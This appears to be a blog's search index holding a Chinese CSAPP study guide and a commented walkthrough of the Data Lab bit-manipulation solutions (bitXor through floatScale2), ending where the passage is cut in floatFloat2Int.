<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Csapp自学指北</title>
    <url>/CSAPP/lab0/2024/02/27/</url>
    <content><![CDATA[<blockquote>
<p>Csapp真心不好学</p>
</blockquote>
<h1 id="链接推荐"><a href="#链接推荐" class="headerlink" title="链接推荐"></a>链接推荐</h1><h2 id="CSAPP导读"><a href="#CSAPP导读" class="headerlink" title="CSAPP导读"></a><a href="https://fengmuzi2003.gitbook.io/csapp3e/">CSAPP导读</a></h2><p>我主要是以这个为索引阅读的,主要是光啃书真的太困难了,我的bomblab就是光啃书做的,痛苦死了</p>
<h2 id="中英精校字幕课程"><a href="#中英精校字幕课程" class="headerlink" title="中英精校字幕课程"></a><a href="https://www.bilibili.com/video/BV1iW411d7hd/">中英精校字幕课程</a></h2><p>这个课程除了没有助教的补充说明(这个在Csapp导读里面有链接),其余部分还是很不错的,字幕完整精确</p>
<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p>总体原则:</p>
<p>尽量做完所有的exercise,做了一部分,感觉出的不错</p>
<p>整本书思维导图:</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402271948748.png" alt="image-20240227194749494"></p>
<p>读书做lab的路线:</p>
<p>第一章:略读</p>
<p>第二章:信息表示和处理,lab1</p>
<p>第三章:程序的机器级表示,推荐书目<a href="https://www.zhihu.com/search?q=%E7%8E%8B%E7%88%BD&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:2655186100%7D">王爽</a>的<strong>《汇编语言》</strong>,可以做lab2_bomblab和lab3_attacklab</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>Csapp的lab1-datalab的最全详解</title>
    <url>/CSAPP/lab1/2023/12/11/</url>
    <content><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ul>
<li>位运算(对!,^,&amp;,~,|,这些符号的准确理解)</li>
<li>float的规格化,非规格化</li>
<li>熟练使用二进制分析</li>
<li>充分清楚逻辑右移和算术右移的区别,以及知道计算机的默认移动</li>
</ul>
<h3 id="做题策略"><a href="#做题策略" class="headerlink" title="做题策略"></a>做题策略</h3><ul>
<li>十分建议自己充分思考,画图举例子,建议从四个bits的位开始举例子</li>
<li>真的不行就看看视频讲解吧,在这里推荐一个b站up的csapp讲解(主要是由于本人不喜欢看文字)</li>
</ul>
<blockquote>
<p><a href="https://www.bilibili.com/video/BV183411k7VM/?spm_id_from=333.337.search-card.all.click&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">【深入理解计算机系统 实验1 CSAPP】datalab + 环境搭建 data lab_哔哩哔哩_bilibili</a></p>
</blockquote>
<ul>
<li>建议把书本认真的看完第一章,我是看到一半到浮点数的规格化就没耐心了,直接做题,导致有较大阻碍</li>
</ul>
<h3 id="代码分享和讲解"><a href="#代码分享和讲解" class="headerlink" title="代码分享和讲解"></a>代码分享和讲解</h3><p>以下是写好的代码,里面有大量的注释便于理解(是在官方给的bit.c中补充函数的功能)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * CS:APP Data Lab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;Please put your name and userid here&gt;</span></span><br><span class="line"><span class="comment"> * zhzvite 2811215248@qq.com</span></span><br><span class="line"><span class="comment"> * bits.c - Source file with your solutions to the Lab.</span></span><br><span class="line"><span class="comment"> *          This is the file you will hand in to your instructor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Do not include the &lt;stdio.h&gt; header; it confuses the dlc</span></span><br><span class="line"><span class="comment"> * compiler. You can still use printf for debugging without including</span></span><br><span class="line"><span class="comment"> * &lt;stdio.h&gt;, although you might get a compiler warning. In general,</span></span><br><span class="line"><span class="comment"> * it&#x27;s not good practice to ignore compiler warnings, but in this</span></span><br><span class="line"><span class="comment"> * case it&#x27;s OK.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0<span class="comment">//lab的规则(类似与游戏规则)</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Instructions to Students:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * STEP 1: Read the following instructions carefully.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">You will provide your solution to the Data Lab by</span><br><span class="line">editing the collection of functions in this source file.</span><br><span class="line"></span><br><span class="line">INTEGER CODING RULES:</span><br><span class="line"> </span><br><span class="line">  Replace the <span class="string">&quot;return&quot;</span> statement in each function with one</span><br><span class="line">  or more lines of C code that implements the function. Your code </span><br><span class="line">  must conform to the following style:</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> <span class="title function_">Funct</span><span class="params">(arg1, arg2, ...)</span> &#123;</span><br><span class="line">      <span class="comment">/* brief description of how your implementation works */</span></span><br><span class="line">      <span class="type">int</span> var1 = Expr1;</span><br><span class="line">      ...</span><br><span class="line">      <span class="type">int</span> varM = ExprM;</span><br><span class="line"></span><br><span class="line">      varJ = ExprJ;</span><br><span class="line">      ...</span><br><span class="line">      varN = ExprN;</span><br><span class="line">      <span class="keyword">return</span> ExprR;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Each <span class="string">&quot;Expr&quot;</span> is an expression using ONLY the following:</span><br><span class="line">  <span class="number">1.</span> Integer constants <span class="number">0</span> through <span class="number">255</span> (<span class="number">0xFF</span>), inclusive. You are</span><br><span class="line">      not allowed to use big constants such as <span class="number">0xffffffff</span>.</span><br><span class="line">  <span class="number">2.</span> Function arguments and local <span class="title function_">variables</span> <span class="params">(no global variables)</span>.</span><br><span class="line">  3. Unary integer operations ! ~</span><br><span class="line">  4. Binary integer operations &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line">    </span><br><span class="line">  Some of the problems <span class="keyword">restrict</span> the <span class="built_in">set</span> of allowed operators even further.</span><br><span class="line">  Each &quot;Expr&quot; may consist of multiple operators. You are not restricted to</span><br><span class="line">  one operator per line.</span><br><span class="line"></span><br><span class="line">  You are expressly forbidden to:</span><br><span class="line">  1. Use any control constructs such as <span class="keyword">if</span>, <span class="keyword">do</span>, <span class="keyword">while</span>, <span class="keyword">for</span>, <span class="keyword">switch</span>, etc.</span><br><span class="line">  2. Define or use any macros.</span><br><span class="line">  3. Define any additional functions in this file.</span><br><span class="line">  4. Call any functions.</span><br><span class="line">  5. Use any other operations, such as &amp;&amp;, ||, -, or ?:</span><br><span class="line">  6. Use any form of casting.</span><br><span class="line">  7. Use any data type other than <span class="type">int</span>.  This implies that you</span><br><span class="line">     cannot use arrays, structs, or unions.</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  You may assume that your machine:</span><br><span class="line">  1. Uses 2s complement, 32-bit representations of integers.</span><br><span class="line">  2. Performs right shifts arithmetically.</span><br><span class="line">  3. Has unpredictable behavior when shifting <span class="keyword">if</span> the shift amount</span><br><span class="line">     is less than 0 or greater than 31.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXAMPLES OF ACCEPTABLE CODING STYLE:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus1 - returns 2^x + 1, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> <span class="title function_">pow2plus1</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; x) + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus4 - returns 2^x + 4, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> <span class="title function_">pow2plus4</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="type">int</span> result = (<span class="number">1</span> &lt;&lt; x);</span><br><span class="line">     result += <span class="number">4</span>;</span><br><span class="line">     <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">FLOATING POINT CODING RULES</span><br><span class="line"></span><br><span class="line">For the problems that require you to implement floating-point operations,</span><br><span class="line">the coding rules are less strict.  You are allowed to use looping and</span><br><span class="line">conditional control.  You are allowed to use both ints and unsigneds.</span><br><span class="line">You can use arbitrary integer and <span class="type">unsigned</span> constants. You can use any arithmetic,</span><br><span class="line">logical, or comparison operations on <span class="type">int</span> or <span class="type">unsigned</span> data.</span><br><span class="line"></span><br><span class="line">You are expressly forbidden to:</span><br><span class="line">  <span class="number">1.</span> Define or use any macros.</span><br><span class="line">  <span class="number">2.</span> Define any additional functions in this file.</span><br><span class="line">  <span class="number">3.</span> Call any functions.</span><br><span class="line">  <span class="number">4.</span> Use any form of casting.</span><br><span class="line">  <span class="number">5.</span> Use any data type other than <span class="type">int</span> or <span class="type">unsigned</span>.  This means that you</span><br><span class="line">     cannot use arrays, structs, or unions.</span><br><span class="line">  <span class="number">6.</span> Use any floating point data types, operations, or constants.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTES:</span><br><span class="line">  <span class="number">1.</span> Use the <span class="title function_">dlc</span> <span class="params">(data lab checker)</span> <span class="title function_">compiler</span> <span class="params">(described in the handout)</span> to </span><br><span class="line">     check the legality of your solutions.</span><br><span class="line">  2. Each function has a maximum number of <span class="title function_">operations</span> <span class="params">(integer, logical,</span></span><br><span class="line"><span class="params">     or comparison)</span> that you are allowed to use <span class="keyword">for</span> your implementation</span><br><span class="line">     of the function.  The max operator count is checked by dlc.</span><br><span class="line">     Note that <span class="title function_">assignment</span> <span class="params">(<span class="string">&#x27;=&#x27;</span>)</span> is not counted; you may use as many of</span><br><span class="line">     these as you want without penalty.penalty:罚款</span><br><span class="line">  <span class="number">3.</span> Use the btest test <span class="title function_">harness</span><span class="params">(马具,挽具)</span> to check your functions <span class="keyword">for</span> correctness.</span><br><span class="line">  4. Use the BDD checker to formally verify your functions</span><br><span class="line">  5. The maximum number of ops <span class="keyword">for</span> each function is given in the</span><br><span class="line">     header comment <span class="keyword">for</span> each function. If there are any inconsistencies </span><br><span class="line">     between the maximum ops in the writeup and in this file, consider</span><br><span class="line">     this file the authoritative source.</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * STEP 2: Modify the following functions according the coding rules.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   IMPORTANT. TO AVOID GRADING SURPRISES:</span></span><br><span class="line"><span class="comment"> *   1. Use the dlc compiler to check that your solutions conform</span></span><br><span class="line"><span class="comment"> *      to the coding rules.</span></span><br><span class="line"><span class="comment"> *   2. Use the BDD checker to formally verify that your solutions produce </span></span><br><span class="line"><span class="comment"> *      the correct answers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//有一些生词,但是不影响阅读</span></span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp;</span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (~(~x &amp; ~y) &amp; ~(x &amp; y));</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  讲解:~(~x&amp;~y)把x,y中都为0的位置标记为0,其余都为1</span></span><br><span class="line"><span class="comment">  ~(x&amp;y)则是把x,y中对应两个都为1的位置标记成0,其余都为1</span></span><br><span class="line"><span class="comment">  故两个相&amp;就是异或的功能</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; <span class="number">31</span>);</span><br><span class="line">  <span class="comment">// 最小的二进制补码的整数,那就是最高位为1,其余位置全为0,int为4个字节,即为32个bit</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (!((~(x + <span class="number">1</span>)) ^ x)) &amp; !!(x + <span class="number">1</span>);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   特判x=-1的情况,用两次!!,把他变为0或者1</span></span><br><span class="line"><span class="comment">   (~(x+1))^x)来验证x是否为最大值</span></span><br><span class="line"><span class="comment">   需要注意,判断a==b,在位运算下这样操作</span></span><br><span class="line"><span class="comment">   !(a^b),为1则相同,为0则不同</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123; <span class="comment">// 首先注意,0xAAAAAAAA这样的串都是从第0位开始,别搞错了</span></span><br><span class="line">  <span class="comment">// 本题思路是让x|0xAAAAAAAA再和x判断相不相等</span></span><br><span class="line">  <span class="comment">// 故a,b,c是为了通过移位造出0xAAAAAAAA,可以用这种办法继续造10个A,12个A,以此类推</span></span><br><span class="line">  <span class="type">int</span> a = <span class="number">0xAA</span> &lt;&lt; <span class="number">8</span>;</span><br><span class="line">  <span class="type">int</span> b = a | <span class="number">0xAA</span>;</span><br><span class="line">  <span class="type">int</span> c = b &lt;&lt; <span class="number">16</span> | b;</span><br><span class="line">  <span class="keyword">return</span> !((x | c) ^ x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * negate - return -x</span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (~x) + <span class="number">1</span>; <span class="comment">// 这里我是以四个bits为例子,随便列举了几个,就试出来了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> cond1 = !((x &gt;&gt; <span class="number">4</span>) ^ <span class="number">0x3</span>);    <span class="comment">// 检查除去前四位是不是满足条件,满足则为1</span></span><br><span class="line">  <span class="type">int</span> b = x &amp; <span class="number">0xf</span>;              <span class="comment">// 这样就是只保留后四位</span></span><br><span class="line">  <span class="type">int</span> cond2 = (b + ~<span class="number">0xA</span> + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>; <span class="comment">// 要让b为0~9之间,则我们知道b-10&lt;0,并且我们知道-x=~x+1,0xA=10,所以用b+~0xA+1再右移31位,判断负号</span></span><br><span class="line">  <span class="keyword">return</span> cond1 &amp; cond2;<span class="comment">//要满足(除去后四位其他位一样)和(后四位符合(0~9)-10&lt;0)两种情况</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z</span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  x = !!x;                   <span class="comment">// 将x转化为bool类型,注意0取反全是0,1取反全是1,妙!</span></span><br><span class="line">  x = ~x + <span class="number">1</span>;                <span class="comment">//-(1)的补码全是1,-(0)的补码全是0,要巧妙运用这个性质,因为max ops限制在6</span></span><br><span class="line">  <span class="keyword">return</span> (x &amp; y) | (~x &amp; z); <span class="comment">// 通过取反,来达成分支的效果,因为他们的取反是可以互相转化的,反正我是没想到</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> cond1 = !(x ^ y);      <span class="comment">// 判断x和y相等</span></span><br><span class="line">  <span class="type">int</span> signx = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>; <span class="comment">// 拿到x,y的符号,分别位signx和signy</span></span><br><span class="line">  <span class="type">int</span> signy = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 接下来判断异号</span></span><br><span class="line">  <span class="comment">// x+y-</span></span><br><span class="line">  <span class="type">int</span> cond2 = !(!signx &amp; signy); <span class="comment">// signx=0,signy=1,cond2=0</span></span><br><span class="line">  <span class="comment">// x-y+</span></span><br><span class="line">  <span class="type">int</span> cond3 = (signx &amp; !signy); <span class="comment">// cond3=1</span></span><br><span class="line">  <span class="comment">// 接下来是同号的情况,同号相减不会溢出</span></span><br><span class="line">  <span class="type">int</span> res = ((x + (~y) + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>; <span class="comment">// res为1则x-y小于0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> cond1 | (cond2 &amp; (cond3 | res)); <span class="comment">// cond2为1还要进行cond3或res的验证故用&amp;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of</span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> negx = ~x + <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> a = (x | negx) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> a + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   int a=~x+1;</span></span><br><span class="line"><span class="comment">   int b=(x^a)&gt;&gt;31;//这种不行是没考虑到溢出的情况.比如四位的数1000,他的取反加一还是1000</span></span><br><span class="line"><span class="comment">   return a+1;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 思路高位有值的话就不能去掉,要找到最高位</span></span><br><span class="line">  <span class="type">int</span> iszero = !x;    <span class="comment">// 判断是否为0,其实不用判断照样可以,因为按照后面的分法,如果是0则所有的bit都是0</span></span><br><span class="line">  <span class="type">int</span> flag = x &gt;&gt; <span class="number">31</span>; <span class="comment">// 取出符号位</span></span><br><span class="line">  <span class="type">int</span> mask = ((!!x) &lt;&lt; <span class="number">31</span>) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  x = (flag &amp; (~x)) | ((~flag) &amp; x); <span class="comment">// x&gt;0时不变,x&lt;0时把0都变成1</span></span><br><span class="line">  <span class="type">int</span> bit_16, bit_8, bit_4, bit_2, bit_1, bit_0;</span><br><span class="line">  bit_16 = !((!!(x &gt;&gt; <span class="number">16</span>)) ^ <span class="number">0x1</span>) &lt;&lt; <span class="number">4</span>; <span class="comment">// 先把x规格化,判断每一个部分有没有值</span></span><br><span class="line">  x &gt;&gt;= bit_16;</span><br><span class="line">  bit_8 = !((!!(x &gt;&gt; <span class="number">8</span>)) ^ <span class="number">0x1</span>) &lt;&lt; <span class="number">3</span>; <span class="comment">// 先把x规格化,判断每一个部分有没有值</span></span><br><span class="line">  x &gt;&gt;= bit_8;</span><br><span class="line">  bit_4 = !((!!(x &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0x1</span>) &lt;&lt; <span class="number">2</span>; <span class="comment">// 先把x规格化,判断每一个部分有没有值</span></span><br><span class="line">  x &gt;&gt;= bit_4;</span><br><span class="line">  bit_2 = !((!!(x &gt;&gt; <span class="number">2</span>)) ^ <span class="number">0x1</span>) &lt;&lt; <span class="number">1</span>; <span class="comment">// 先把x规格化,判断每一个部分有没有值</span></span><br><span class="line">  x &gt;&gt;= bit_2;</span><br><span class="line">  bit_1 = !((!!(x &gt;&gt; <span class="number">1</span>)) ^ <span class="number">0x1</span>); <span class="comment">// 先把x规格化,判断每一个部分有没有值</span></span><br><span class="line">  x &gt;&gt;= bit_1;</span><br><span class="line">  bit_0 = x; <span class="comment">// 最后的x只能是1或者0</span></span><br><span class="line">  <span class="type">int</span> res = bit_16 + bit_8 + bit_4 + bit_2 + bit_1 + bit_0 + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// return iszero|(mask&amp;res);</span></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// float</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 做到这道题,你就要去看看规格化和非规格化了,在我的笔记里面有</span></span><br><span class="line">  <span class="comment">// expr,s,frac</span></span><br><span class="line">  <span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; (<span class="number">0x1</span>);     <span class="comment">// 把s,expr,frac全部取出来</span></span><br><span class="line">  <span class="type">unsigned</span> expr = (uf &gt;&gt; <span class="number">23</span>) &amp; (<span class="number">0xFF</span>); <span class="comment">// 把s,expr,frac全部取出来</span></span><br><span class="line">  <span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>);     <span class="comment">// 把s,expr,frac全部取出来</span></span><br><span class="line">  <span class="keyword">if</span> (expr == <span class="number">0</span> &amp;&amp; frac == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> uf; <span class="comment">// 就是0,直接返回uf</span></span><br><span class="line">  <span class="comment">// 无穷大</span></span><br><span class="line">  <span class="keyword">if</span> (expr == <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  <span class="comment">// 非规格化</span></span><br><span class="line">  <span class="keyword">if</span> (expr == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    frac &lt;&lt;= <span class="number">1</span>; <span class="comment">//*2</span></span><br><span class="line">    <span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | frac;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 规格化</span></span><br><span class="line">  expr++;                                 <span class="comment">// 规格化了,乘以2,毕竟隐藏的尾数是1</span></span><br><span class="line">  <span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | (expr &lt;&lt; <span class="number">23</span>) | frac; <span class="comment">// 拼凑出厂</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 